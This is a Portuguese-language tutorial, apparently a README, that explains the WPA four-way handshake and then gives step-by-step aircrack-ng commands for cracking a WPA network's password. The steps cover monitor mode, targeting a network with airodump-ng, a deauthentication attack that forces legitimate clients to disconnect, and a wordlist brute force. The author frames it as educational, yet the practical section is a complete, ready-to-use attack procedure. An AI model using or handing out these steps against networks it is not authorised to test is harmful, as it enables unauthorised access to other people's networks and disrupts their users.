# Leia

Fiz esse texto apenas para cunho educacional e informativo, não me responsabilizo pelas atitudes dos leitores

Também fiz esse texto letra por letra, então se for copiar deixa os créditos também s2

# Pré-requisitos para fazer esse ataque:

Suíte de ferramentas do aircrack (https://www.aircrack-ng.org/)
Uma rede alvo que use o padrão WPA (1 ou 2)
Uma placa wifi que tenha suporte ao modo monitor


# Como funciona esse ataque:

Quando um dispositivo (Station ou client) vai se conectar a um roteador (Access Point ou AP) eles dois fazem uma comunicação chamada de **4 way handshake**, 4 "mensagens" que são trocadas entre esses dois onde o dispositivo vai provar para o roteador que ele tem a senha correta e o roteador vai fazer essa verificação

Entre essas quatro mensagens, as mais importantes para nós são a primeira e a segunda pois é utilizando o que vamos capturar nessa duas "mensagens" que nós vamos refazer os hashes até achar a senha correta

### Primeira mensagem
O roteador manda um **ANonce** (um valor aleatório gerado apenas para aquele handshake) para o client

### Segunda mensagem
O dispositivo pega o ANonce enviando pelo AP e monta um pacote PTK que contém as seguintes informações:
```
ANonce
SNonce (Outro nonce, mas dessa vez, gerado pelo dispositivo)
Mac address do dispositivo
Mac address do roteador
Hash da senha (a qual vamos fazer a força bruta)
```
E a partir dessas informações ele vai juntar tudo em uma hash chamada MIC e assim, ele vai mandar o MIC e o SNonce (até então o roteador não sabia, então ele precisa mandar de forma isolada pro roteador conseguir remontar esse pacote e verificar se as hashes batem)

E assim ele manda para o roteador:

```
SNonce: valoraleatorioaaa24245646
MIC: senhajuntocomtudoadawdajdiaw242002920
```

Então, a nossa função aqui é capturar essa comunicação, anotar esses valores e pegar uma wordlist boa o suficiente para a ter a senha do nosso alvo kkkk

# Vamos para a prática
Primeiro de tudo nós precisamos colocar nossa placa no modo **monitor**

Vamos fazer isso da maneira mais fácil que utilizando a ferramento airmon-ng:
```
sudo airmon-ng start <interface que vamos usar>
```

Agora vamos escanear as redes ao nosso redor e pegar o **BSSID** (MAC address) e o canal do nosso alvo:

```
sudo airodump-ng <nossa interface em modo monitor>
```

Após anotarmos o **BSSID** e o **CH** do nosso alvo, vamos filtrar melhor as nossas buscas e também mandar a ferramenta escrever tudo que ela conseguir capturar em um arquivo:

```
sudo airodump-ng <nossa interface em modo monitor> -d <BSSID anotado> -c <CH anotado> -w captura
```

Aqui nós vamos esperar algum client legítimo se conectar nessa rede para capturarmos essa conexão e partirmos para o bruteforce. Porém eu não sou tão paciente assim e vou forçar os clients que já estão na rede a se desconectarem e quando o aparelho se conectar de volta automaticamente nós capturamos

Vamos usar outra ferramenta a suíte do aircrack

```
Abrimos outro terminal e colocamos:

sudo aireplay-ng <nossa interface em modo monitor> --deauth 10 -a <BSSID anotado>
```

Caso no terminal que nós usamos o airodump-ng aparecer algo como: **"WPA handshake: <BSSID do seu alvo>"** na parte de cima
**Você conseguiu!** Agora é só partir pro bruteforce

Para isso nós usamos o próprio aircrack-ng

```
sudo aircrack-ng captura-01.cap -w <sua wordlist>
```

> É aqui onde a ferramenta vai tentar refazer o pacote PTK e verificar se o MIC gerado vai bater com o que o client enviou para o AP

E pronto! Ataque feito, qualquer dúvida só me chamar

*Obs: não sou profissional na área wireless, e estou sujeito a cometer erros também. Caso eu tenha escrito alguma informação errada é só me avisa*
